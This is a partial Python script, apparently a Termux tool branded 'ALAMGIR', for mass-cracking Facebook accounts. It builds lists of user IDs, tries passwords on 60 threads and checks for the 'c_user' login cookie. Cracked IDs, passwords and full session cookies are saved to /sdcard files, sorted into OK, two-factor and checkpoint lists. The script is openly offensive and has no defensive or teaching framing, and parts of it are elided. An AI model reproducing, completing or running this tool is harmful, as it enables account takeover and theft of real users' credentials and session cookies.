#ASSALAMUALAIKUM
#TOOL OWNER SYED ALAMGIR ISLAM#
#FACEBOOK :  ALAMGIR ISLAM
#BROTHER : Kutta golo
#GITHUB : ALAMGIR-123
#TEAM : ALAMGIR-143
...
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     ...
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;36m7.2                   
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
...
def ALAMGIR(): 
        ...
        print("\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
        Saba =input("\n\x1b[38;5;155m [➤] \033[1;32m𝐂𝐇𝐎𝐎𝐒𝐄 𝐀 ??𝐀𝐋𝐈𝐃 𝐎𝐏𝐓𝐈𝐎𝐍 : \033[1;32m")
        if Saba in ['1']:        	
            ALAMGIR()
        if Saba in ['2']:
...
def ALAMGIR():    
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp) 
    with ThreadPool(max_workers=60) as ALAMGIR:
        os.system('clear')
        time.sleep(0.2)
        print(logo)
        tl = str(len(user))
        ...
        for guru in user:
            ...
            ALAMGIR.submit(rcrack,uid,pwx,tl) 
    print('\n')
    print('\033[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\x1b[38;5;155m[➤] ALAMGIR~XD  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ')
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('')
                print(f"\x1b[1;92m[➤] ALAMGIR OK ♥︎ {uid} \x1b[1;94m•\x1b[1;32m {ps} \n\033[1;32m[COOKIE]➤ \033[1;91m {coki} \n  ")
                open('/sdcard/ALAMGIR-𝙰𝙲𝚃𝙸𝚅𝙴😍💚.txt', 'a').write(uid+' • '+ps+' • ''[COOKIE]'  +coki+' \n')
                oks.append(uid)
                break
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\033[38;5;45m[ALAMGIR-2𝙵] '+uid+' [💙] '+ps+' ')
                    open('/sdcard/ALAMGIR-2𝙵💙.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]                    
                    print(f'\r\033[1;30m[ALAMGIR CP💔] '+uid+' [💔] '+ps+' ')                    
                    open('/sdcard/ALAMGIR-𝐂𝐏🥺💔.txt', 'a').write(uid+' | '+ps+'\n')
                    cps.append(uid)
                break
            else:
                continue
